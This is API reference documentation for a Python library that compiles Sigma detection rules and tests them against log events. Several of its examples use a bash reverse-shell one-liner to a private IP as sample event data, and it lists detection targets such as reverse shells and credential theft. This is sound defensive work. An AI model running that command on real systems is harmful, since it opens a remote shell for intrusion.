# Sigma Simple Backend - API Reference

This document provides detailed API reference for the Sigma Simple Backend library.

## Table of Contents

- [Classes](#classes)
  - [SimpleEvalBackend](#simpleevalbackend)
  - [RestrictivenessLevel](#restrictivenesslevel)
  - [Alert](#alert)
  - [SimpleRule](#simplerule)
  - [MockRuleCollection](#mockrulecollection)
- [Functions](#functions)
- [Field Mappings](#field-mappings)
- [Examples](#examples)

## Classes

### SimpleEvalBackend

Main backend class for Sigma rule compilation and evaluation.

```python
class SimpleEvalBackend:
    def __init__(
        self,
        pipeline=None,
        restrictiveness: RestrictivenessLevel = RestrictivenessLevel.BALANCED,
        field_mappings: Optional[Dict[str, str]] = None,
    )
```

#### Constructor Parameters

- **pipeline** (`Optional[Any]`): Optional processing pipeline (not used in simple backend)
- **restrictiveness** (`RestrictivenessLevel`): How restrictive rule matching should be
  - Default: `RestrictivenessLevel.BALANCED`
- **field_mappings** (`Optional[Dict[str, str]]`): Custom field mappings for log formats
  - Default: Uses built-in field mappings

#### Methods

##### compile(rule_collection) → List[Callable]

Compile Sigma rules to executable functions.

**Parameters:**

- `rule_collection`: Collection of Sigma rules to compile

**Returns:**

- `List[Callable]`: List of compiled rule functions

**Example:**

```python
backend = SimpleEvalBackend()
rule_collection = MockRuleCollection()
compiled_rules = backend.compile(rule_collection)
```

##### test_rule_against_event(rule_function, event) → Optional[Alert]

Test a compiled rule against an event.

**Parameters:**

- `rule_function` (`Callable`): Compiled rule function
- `event` (`Dict[str, Any]`): Event data to test

**Returns:**

- `Optional[Alert]`: Alert object if rule matches, None otherwise

**Example:**

```python
event = {
    "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "_COMM": "bash"
}

for rule_func in compiled_rules:
    alert = backend.test_rule_against_event(rule_func, event)
    if alert:
        print(f"Alert: {alert.rule_title}")
```

#### Properties

- **restrictiveness** (`RestrictivenessLevel`): Current restrictiveness level
- **field_mappings** (`Dict[str, str]`): Field mappings dictionary
- **pipeline**: Processing pipeline (not used)

---

### RestrictivenessLevel

Enumeration of restrictiveness levels for rule matching.

```python
class RestrictivenessLevel(Enum):
    PERMISSIVE = "permissive"
    BALANCED = "balanced"
    RESTRICTIVE = "restrictive"
    ULTRA_RESTRICTIVE = "ultra"
```

#### Values

- **PERMISSIVE**: Match many patterns (may have false positives)
  - Best for: Research and threat hunting
  - Broad detection coverage
- **BALANCED**: Balance between detection and false positives
  - Best for: Development and testing environments
  - Good detection with manageable false positives
- **RESTRICTIVE**: Only high-confidence matches
  - Best for: Most production environments
  - Low false positive rate
- **ULTRA_RESTRICTIVE**: Only confirmed malicious activity
  - Best for: Production environments where false positives are costly
  - Minimal false positives

---

### Alert

Alert object generated when a rule matches an event.

```python
@dataclass
class Alert:
    rule_title: str
    rule_id: str
    severity: str
    description: str
    event_data: Dict[str, Any]
    mitre_tactics: List[str] = None
    mitre_techniques: List[str] = None
```

#### Properties

- **rule_title** (`str`): Human-readable rule title
- **rule_id** (`str`): Unique rule identifier
- **severity** (`str`): Alert severity level ("low", "medium", "high", "critical")
- **description** (`str`): Rule description
- **event_data** (`Dict[str, Any]`): Original event data that triggered the alert
- **mitre_tactics** (`List[str]`): MITRE ATT&CK tactics (e.g., ["Execution", "Persistence"])
- **mitre_techniques** (`List[str]`): MITRE ATT&CK techniques (e.g., ["T1059", "T1053"])

#### Example

```python
if alert:
    print(f"Rule: {alert.rule_title}")
    print(f"Severity: {alert.severity}")
    print(f"Description: {alert.description}")

    if alert.mitre_tactics:
        print(f"MITRE Tactics: {', '.join(alert.mitre_tactics)}")

    if alert.mitre_techniques:
        print(f"MITRE Techniques: {', '.join(alert.mitre_techniques)}")
```

---

### SimpleRule

Internal representation of compiled Sigma rules.

```python
@dataclass
class SimpleRule:
    title: str
    rule_id: str
    description: str
    level: str
    tags: List[str]
    detection: Dict[str, Any]
    mitre_tactics: List[str] = None
    mitre_techniques: List[str] = None
```

#### Properties

- **title** (`str`): Rule title
- **rule_id** (`str`): Unique rule identifier
- **description** (`str`): Rule description
- **level** (`str`): Rule severity level
- **tags** (`List[str]`): Rule tags
- **detection** (`Dict[str, Any]`): Detection logic
- **mitre_tactics** (`List[str]`): MITRE ATT&CK tactics
- **mitre_techniques** (`List[str]`): MITRE ATT&CK techniques

---

### MockRuleCollection

Mock rule collection for testing when Sigma rules aren't available.

```python
class MockRuleCollection:
    def __init__(self)
```

#### Properties

- **rules** (`List[MockRule]`): List of mock rules

#### Built-in Mock Rules

The mock collection includes rules for detecting:

1. **Reverse Shells**

   - Bash reverse shells
   - Netcat reverse shells
   - Python reverse shells
   - Perl reverse shells

2. **Privilege Escalation**

   - Sudo abuse
   - Su commands
   - Setuid exploitation

3. **Credential Theft**

   - Shadow file access
   - SSH key access
   - Password file access

4. **Network Attacks**

   - Port scanning
   - Mass scanning
   - Network reconnaissance

5. **Web Exploitation**

   - PHP shells
   - SQL injection
   - XSS attacks

6. **Defense Evasion**

   - Log clearing
   - History manipulation
   - File deletion

7. **Persistence**

   - Cron job creation
   - Service installation
   - Startup script modification

8. **Malware**
   - Known malicious tools
   - Backdoors
   - Rootkits

## Functions

### example_usage()

Demonstration function showing basic usage patterns.

```python
def example_usage():
    # Initialize backend
    backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.BALANCED)

    # Load rules
    rule_collection = MockRuleCollection()
    compiled_rules = backend.compile(rule_collection)

    # Test event
    test_event = {
        "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "_COMM": "bash",
        "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    }

    # Evaluate
    for rule_func in compiled_rules:
        alert = backend.test_rule_against_event(rule_func, test_event)
        if alert:
            print(f"Alert: {alert.rule_title}")
```

## Field Mappings

Default field mappings for common log formats:

### System Process Fields

```python
{
    "process.name": "_COMM",
    "process.pid": "_PID",
    "process.command_line": "_CMDLINE",
    "process.executable": "_EXE",
    "user.name": "_UID_NAME",
    "user.id": "_UID",
    "host.name": "_HOSTNAME",
    "service.name": "_SYSTEMD_UNIT",
}
```

### Log Message Fields

```python
{
    "log.message": "MESSAGE",
}
```

### Windows Event Log Fields

```python
{
    "winlog.event_id": "EventID",
    "winlog.provider_name": "Provider_Name",
    "winlog.channel": "Channel",
}
```

### Syslog Fields

```python
{
    "syslog.facility": "facility",
    "syslog.severity": "severity",
    "syslog.hostname": "hostname",
}
```

### Custom Field Mappings

You can provide custom field mappings when initializing the backend:

```python
custom_mappings = {
    "process.name": "ProcessName",
    "process.command_line": "CommandLine",
    "user.name": "UserName",
    "log.message": "Message",
}

backend = SimpleEvalBackend(field_mappings=custom_mappings)
```

## Examples

### Basic Usage

```python
from sigma_simple_backend import SimpleEvalBackend, RestrictivenessLevel, MockRuleCollection

# Initialize
backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE)
rule_collection = MockRuleCollection()
compiled_rules = backend.compile(rule_collection)

# Test event
event = {
    "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "_COMM": "bash",
    "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
}

# Evaluate
for rule_func in compiled_rules:
    alert = backend.test_rule_against_event(rule_func, event)
    if alert:
        print(f"🚨 {alert.rule_title} (Severity: {alert.severity})")
```

### Custom Field Mappings

```python
# Define custom mappings
custom_mappings = {
    "process.name": "proc_name",
    "log.message": "log_msg",
    "user.name": "username",
}

# Initialize with custom mappings
backend = SimpleEvalBackend(
    restrictiveness=RestrictivenessLevel.BALANCED,
    field_mappings=custom_mappings
)

# Your log format
event = {
    "proc_name": "bash",
    "log_msg": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "username": "user",
}

# Test normally
compiled_rules = backend.compile(MockRuleCollection())
for rule_func in compiled_rules:
    alert = backend.test_rule_against_event(rule_func, event)
    if alert:
        print(f"Alert: {alert.rule_title}")
```

### Different Restrictiveness Levels

```python
test_event = {
    "MESSAGE": "suspicious command",
    "_COMM": "bash"
}

# Compare restrictiveness levels
levels = [
    RestrictivenessLevel.PERMISSIVE,
    RestrictivenessLevel.BALANCED,
    RestrictivenessLevel.RESTRICTIVE,
    RestrictivenessLevel.ULTRA_RESTRICTIVE
]

for level in levels:
    backend = SimpleEvalBackend(restrictiveness=level)
    compiled_rules = backend.compile(MockRuleCollection())

    alert_count = 0
    for rule_func in compiled_rules:
        if backend.test_rule_against_event(rule_func, test_event):
            alert_count += 1

    print(f"{level.value}: {alert_count} alerts")
```

### Alert Handling

```python
def handle_alert(alert: Alert, event: dict):
    """Custom alert handler"""

    print(f"🚨 SECURITY ALERT")
    print(f"Rule: {alert.rule_title}")
    print(f"Severity: {alert.severity}")

    if alert.mitre_tactics:
        print(f"MITRE Tactics: {', '.join(alert.mitre_tactics)}")

    # Log to file
    with open("security_alerts.log", "a") as f:
        f.write(f"{datetime.now()}: {alert.rule_title}\n")

    # Send to SIEM, notification system, etc.
    if alert.severity in ["high", "critical"]:
        send_urgent_notification(alert)

# Use the handler
for rule_func in compiled_rules:
    alert = backend.test_rule_against_event(rule_func, event)
    if alert:
        handle_alert(alert, event)
```

## Error Handling

The backend is designed to be robust and handle various error conditions gracefully:

```python
try:
    # Backend initialization
    backend = SimpleEvalBackend()
    rule_collection = MockRuleCollection()
    compiled_rules = backend.compile(rule_collection)

    # Event processing
    for event in events:
        for rule_func in compiled_rules:
            try:
                alert = backend.test_rule_against_event(rule_func, event)
                if alert:
                    handle_alert(alert)
            except Exception as e:
                print(f"Error processing event: {e}")
                continue

except Exception as e:
    print(f"Error initializing backend: {e}")
```

## Performance Considerations

- Rule compilation is done once, evaluation is fast
- Use appropriate restrictiveness levels to balance detection vs performance
- Consider field mapping efficiency for large log volumes
- The backend is designed for real-time processing

```python
import time

# Measure performance
start_time = time.time()

for event in large_event_list:
    for rule_func in compiled_rules:
        backend.test_rule_against_event(rule_func, event)

elapsed = time.time() - start_time
rate = len(large_event_list) / elapsed
print(f"Processed {rate:.0f} events/second")
```
